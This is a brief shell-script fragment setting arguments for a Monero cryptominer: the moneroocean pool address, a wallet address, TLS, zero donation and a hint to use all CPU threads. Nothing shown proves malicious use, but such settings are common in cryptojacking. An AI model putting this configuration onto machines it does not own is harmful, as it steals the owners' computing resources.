...
ARGS="--url gulf.moneroocean.stream:443 --user 48wk97EaXFA9Q6gTuDWu5oKLFEpPCARoyLjnJ9snWnk5LzJ2BVNrDnDBKyY8oZmYvRQ4G1D1f4AuhVhdRWYh65ud3RnpThi --pass $PASS --donate-level 0 --tls --cpu-max-threads-hint=100"
